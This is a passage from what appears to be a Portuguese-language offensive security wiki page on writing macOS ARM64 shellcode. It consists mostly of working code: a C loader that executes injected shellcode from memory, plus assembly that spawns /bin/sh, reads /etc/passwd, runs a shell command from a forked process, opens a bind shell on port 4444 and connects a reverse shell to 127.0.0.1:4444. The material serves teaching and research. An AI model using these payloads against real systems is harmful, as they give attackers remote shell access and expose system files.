#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Retirado de [**here**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) e explicado.

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### Ler com cat

O objetivo é executar `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, então o segundo argumento (x1) é um array de parâmetros (que na memória significa uma pilha de endereços).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Invocar comando com sh a partir de um fork para que o processo principal não seja morto
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell de [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) na **porta 4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

De [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell para **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{{#include ../../../banners/hacktricks-training.md}}
